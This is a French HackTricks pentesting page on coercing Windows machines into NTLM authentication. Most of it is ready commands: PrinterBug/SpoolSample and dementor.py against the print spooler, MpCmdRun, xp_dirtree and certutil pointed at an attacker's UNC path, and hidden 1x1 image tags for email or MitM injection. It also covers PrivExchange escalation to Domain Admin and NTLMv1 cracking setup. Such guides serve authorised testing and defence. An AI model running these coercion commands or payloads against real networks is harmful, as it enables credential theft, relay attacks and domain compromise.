# Forcer l'authentification privilégiée NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous voulez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **déclencheurs d'authentification à distance** codés en C# utilisant le compilateur MIDL pour éviter les dépendances tierces.

## Abus du service Spooler

Si le service _**Print Spooler**_ est **activé**, vous pouvez utiliser des identifiants AD déjà connus pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouveaux travaux d'impression et lui dire simplement d'**envoyer la notification à un système**.\
Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit **s'authentifier contre** ce **système**. Par conséquent, un attaquant peut amener le service _**Print Spooler**_ à s'authentifier contre un système arbitraire, et le service utilisera **le compte de l'ordinateur** dans cette authentification.

### Trouver des serveurs Windows sur le domaine

En utilisant PowerShell, obtenez une liste de machines Windows. Les serveurs sont généralement une priorité, concentrons-nous donc là-dessus :
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Recherche de services Spooler en écoute

En utilisant une version légèrement modifiée du [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), vérifiez si le Service Spooler est en écoute :
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Vous pouvez également utiliser rpcdump.py sur Linux et rechercher le protocole MS-RPRN
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Demander au service de s'authentifier contre un hôte arbitraire

Vous pouvez compiler[ **SpoolSample d'ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou utilisez [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si vous êtes sur Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinaison avec la délégation non restreinte

Si un attaquant a déjà compromis un ordinateur avec [Délégation non restreinte](unconstrained-delegation.md), l'attaquant pourrait **forcer l'authentification de l'imprimante contre cet ordinateur**. En raison de la délégation non restreinte, le **TGT** du **compte d'ordinateur de l'imprimante** sera **sauvegardé dans** la **mémoire** de l'ordinateur avec délégation non restreinte. Comme l'attaquant a déjà compromis cet hôte, il pourra **récupérer ce ticket** et en abuser ([Pass the Ticket](pass-the-ticket.md)).

## RCP Forcer l'authentification

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

L'attaque `PrivExchange` est le résultat d'un défaut trouvé dans la fonctionnalité `PushSubscription` du **Serveur Exchange**. Cette fonctionnalité permet à tout utilisateur du domaine avec une boîte mail de forcer le serveur Exchange à s'authentifier sur n'importe quel hôte fourni par le client via HTTP.

Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il dispose des privilèges **WriteDacl sur le domaine avant la mise à jour cumulative de 2019**). Ce défaut peut être exploité pour permettre le **relais d'informations vers LDAP et par la suite extraire la base de données NTDS du domaine**. Dans les cas où le relais vers LDAP n'est pas possible, ce défaut peut encore être utilisé pour relayer et authentifier à d'autres hôtes au sein du domaine. L'exploitation réussie de cette attaque donne un accès immédiat à l'Admin du Domaine avec n'importe quel compte utilisateur de domaine authentifié.

## À l'intérieur de Windows

Si vous êtes déjà à l'intérieur de la machine Windows, vous pouvez forcer Windows à se connecter à un serveur en utilisant des comptes privilégiés avec :

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Ou utilisez cette autre technique : [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Il est possible d'utiliser certutil.exe lolbin (binaire signé par Microsoft) pour forcer l'authentification NTLM :
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Injection HTML

### Par email

Si vous connaissez **l'adresse email** de l'utilisateur qui se connecte sur une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **email avec une image 1x1** telle que
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
et lorsqu'il l'ouvrira, il essaiera de s'authentifier.

### MitM

Si vous pouvez réaliser une attaque MitM sur un ordinateur et injecter du HTML dans une page qu'il visualisera, vous pourriez essayer d'injecter une image comme la suivante dans la page :
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Craquage de NTLMv1

Si vous pouvez capturer des [défis NTLMv1, lisez ici comment les craquer](../ntlm/#ntlmv1-attack).\
_N'oubliez pas que pour craquer NTLMv1, vous devez régler le défi Responder sur "1122334455667788"_

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous voulez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts [hacktricks](https://github.com/carlospolop/hacktricks) et [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
